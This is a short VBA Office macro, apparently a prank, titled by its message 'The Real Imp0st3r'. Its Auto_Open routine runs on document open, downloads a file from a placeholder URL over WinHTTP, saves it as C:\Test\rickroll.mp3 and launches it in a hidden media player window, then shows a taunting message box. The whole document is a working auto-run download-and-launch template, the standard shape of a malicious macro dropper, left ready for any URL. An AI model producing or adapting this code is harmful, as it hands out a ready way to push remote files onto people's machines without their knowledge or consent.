Sub Auto_Open()
Dim FileNum As Long
    Dim FileData() As Byte
    Dim MyFile As String
    Dim WHTTP As Object
    
    On Error Resume Next
        Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5")
        If Err.Number <> 0 Then
            Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5.1")
        End If
    On Error GoTo 0
    
    MyFile = "<Your Website With File To Download>"
    
    WHTTP.Open "GET", MyFile, False
    WHTTP.Send
    FileData = WHTTP.ResponseBody
    Set WHTTP = Nothing
    
    If Dir("C:\Test", vbDirectory) = Empty Then MkDir "C:\Test"
    
    FileNum = FreeFile
    Open "C:\Test\rickroll.mp3" For Binary Access Write As #FileNum
        Put #FileNum, 1, FileData
    Close #FileNum
    Shell "C:\Program Files (x86)\Windows Media Player\wmplayer.exe ""C:\Test\rickroll.mp3""", vbHide
    MsgBox "The Real Imp0st3r Is Never Gonna Give You Up, Never Gonna Let You Down, Never Gonna Run Around & Desert You, Never Gonna Make You Cry, Never Gonna Say Goodbye, Never Gonna Tell A Lie & Hurt You!"
End Sub